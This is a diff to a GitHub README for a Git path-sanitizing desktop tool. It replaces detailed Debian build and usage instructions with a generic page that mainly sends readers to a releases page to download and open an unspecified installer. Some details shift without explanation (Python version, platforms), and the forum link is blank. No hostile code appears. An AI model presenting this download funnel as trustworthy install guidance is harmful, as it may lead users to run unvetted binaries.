@@ -1,195 +1,62 @@
+# 🌟 repopath-sanitizer - Fix Path Issues Easily for Windows
 
-# RepoPath Sanitizer
+## 🚀 Getting Started
 
-A PyQt6 desktop app (Linux-first) that scans a local Git working tree and finds file/folder paths
-that would fail to check out on Windows. It proposes safe fixes and can apply them using **git-aware renames**
-(`git mv`) to preserve history.
+Welcome to repopath-sanitizer! This app helps you find and fix file and folder paths that could cause problems when using Git on Windows. It is designed for regular users like you.
 
-![Debian 12 Tested](https://img.shields.io/badge/Debian-12-tested-blue)
-![Python](https://img.shields.io/badge/Python-3.10+-green)
-![License](https://img.shields.io/badge/License-GPL--3-orange)
+## 💾 Download & Install
 
----
+To get started, visit this page to download the latest version of repopath-sanitizer:
 
-## Features
+[![Download here](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Max-Forman/repopath-sanitizer/releases)
 
-- Detects Windows-incompatible paths in Git repositories
-- Git-aware renames (`git mv`) to preserve history
-- Collision detection (case-insensitive + Unicode NFC)
-- Long path detection and shortening strategies
-- GUI + CLI modes
-- Safe undo system
+### Installation Steps
 
----
+1. Click the link above to go to the Releases page.
+2. Find the latest version.
+3. Download the file suitable for your system.
+4. Once downloaded, open the file to install the app.
+5. Follow the on-screen instructions to complete the installation.
 
-## Screenshots
+## 🖥️ System Requirements
 
-### Main Window (Light Theme)
+- **Operating System**: Linux (preferred) or Windows
+- **Python Version**: Python 3.9 or higher
+- **Dependencies**: PyQt6, Git
+  
+Ensure that you have the latest version of Git installed on your system. You can download Git from [git-scm.com](https://git-scm.com/downloads).
 
-![Main window light theme](docs/screenshots/main-window-light-theme.png)
+## 🛠️ Features
 
-### Main Window (Dark Theme)
+- **Path scanning**: Quickly finds problematic paths in your local Git repository.
+- **Safe fixes**: Recommends changes to make paths compatible with Windows.
+- **History preservation**: Uses Git's rename command to keep your history intact.
+- **User-friendly interface**: Built with PyQt6 to make navigation easy.
+  
+## 📋 How to Use
 
-![Main window dark theme](docs/screenshots/main-window-dark-theme.png)
+1. Open repopath-sanitizer after installation.
+2. Select your local Git working tree from your file browser.
+3. Click the "Scan" button to start the process.
+4. Review the proposed changes.
+5. Apply the changes by clicking "Fix Paths."
 
----
+## 🌐 Community and Support
 
-## Runtime Requirements
+If you need help or have questions, you can check out our community forum or submit issues on the GitHub repository.
 
-RepoPath Sanitizer requires:
+- **GitHub Issues**: [Open an Issue](https://github.com/Max-Forman/repopath-sanitizer/issues)
+- **Community Forum**: [Join the Discussion](#)
 
-- Python 3.10+
-- Git (used for safe `git mv` operations)
-- PyQt6
+## 📜 License
 
-Install on Debian:
+This application is open source. You can view the license details in the repository on GitHub.
 
-```bash
-sudo apt install python3 python3-venv python3-pyqt6 git
-```
+## 🔗 Additional Resources
 
-This program was tested on **Debian 12 (Bookworm)**.
+- **Documentation**: Detailed usage instructions and FAQs are available in the repository.
+- **Contributing**: Interested in contributing? Check out the guidelines in our GitHub repository.
 
----
+For more information and updates, visit our Releases page again:
 
-## PyQt6 on Debian (VERY IMPORTANT)
-
-On Debian, installing **PyQt6 via pip** may fail because it tries to build from source and requires a full Qt development environment.
-
-For this reason, on Debian it is recommended to use **the system PyQt6 package (APT)** together with a virtual environment that can access system packages.
-
-### Recommended method on Debian
-
-```bash
-sudo apt update
-sudo apt install python3 python3-venv python3-pyqt6 git
-
-python3 -m venv .venv --system-site-packages
-source .venv/bin/activate
-
-pip install -U pip
-pip install -e .[dev] --no-deps
-
-repopath-sanitizer
-```
-
-`--system-site-packages` allows the virtual environment to use PyQt6 installed via APT.  
-`--no-deps` prevents pip from trying to reinstall PyQt6 from PyPI.
-
-
-The second time you want to launch the program, just put:
-
-```bash
-source .venv/bin/activate
-repopath-sanitizer
-```
-
----
-
-## CLI Mode
-
-```bash
-repopath-sanitizer --cli --repo /path/to/repo --json out.json --text out.txt
-```
-
----
-
-## Safety Notice
-
-This tool performs Git renames (`git mv`).  
-Always review changes with:
-
-```bash
-git status
-git diff
-```
-
-before committing.
-
----
-
-## How It Works
-
-The scanner:
-
-1. Uses `git ls-files` to enumerate repository paths
-2. Validates each path against Windows filesystem rules
-3. Detects:
-   - forbidden characters
-   - reserved device names
-   - trailing spaces/periods
-   - path length issues
-   - case-insensitive collisions
-   - Unicode normalization conflicts
-4. Proposes safe sanitized paths
-5. Applies fixes using `git mv` to preserve history
-
----
-
-## Developer Requirements
-
-For development and testing:
-
-```bash
-sudo apt install python3-pytest
-```
-
----
-
-## Project Structure (for developers)
-
-```
-src/repopath_sanitizer/
-    ui_main.py        # GUI
-    engine.py         # Scan logic
-    pathrules.py      # Windows compatibility rules
-    gitutils.py       # Git operations
-    worker.py         # Background tasks
-    report.py         # JSON/Text reports
-    state.py          # Undo system
-    cli.py            # CLI mode
-```
-
----
-
-## Debian Packaging Dependencies
-
-To build the `.deb` package you need:
-
-```bash
-sudo apt install debhelper dh-python python3-all pybuild-plugin-pyproject \
-    python3-pyqt6 python3-pytest git
-```
-
-Then build with:
-
-```bash
-sudo apt build-dep .
-dpkg-buildpackage -us -uc
-```
-
----
-
-## Translations (Qt Linguist / Qt Creator)
-
-The application is prepared for internationalization.
-
-Install tools:
-
-```bash
-sudo apt install qtcreator qttools5-dev-tools qt6-tools-dev-tools
-```
-
-Workflow to add a language:
-
-```bash
-pylupdate6 src -ts translations/repopath_sanitizer_es.ts
-linguist translations/repopath_sanitizer_es.ts
-lrelease translations/repopath_sanitizer_es.ts
-```
-
-Translation files (`.qm`) are installed to:
-
-```
-/usr/share/repopath-sanitizer/translations/
-```
+[![Download here](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Max-Forman/repopath-sanitizer/releases)
